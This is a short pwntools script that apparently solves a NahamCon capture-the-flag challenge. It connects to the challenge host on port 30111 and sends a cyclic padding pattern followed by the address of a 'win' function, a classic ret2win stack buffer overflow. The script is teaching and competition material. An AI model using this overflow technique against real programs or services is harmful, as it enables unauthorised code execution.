from pwn import *
chall = ELF("./chall")
p = process("./chall")
#nc challenge.nahamcon.com 30111
p = remote("challenge.nahamcon.com", 30111)
pattern = "A"*cyclic_find("faab")
#0000000000401215 <win>:
flag = p64(0x0000000000401215)
p.recvuntil("Can you overflow this?: ")
#raw_input("GDB gan")
p.sendline(pattern + flag)
p.interactive()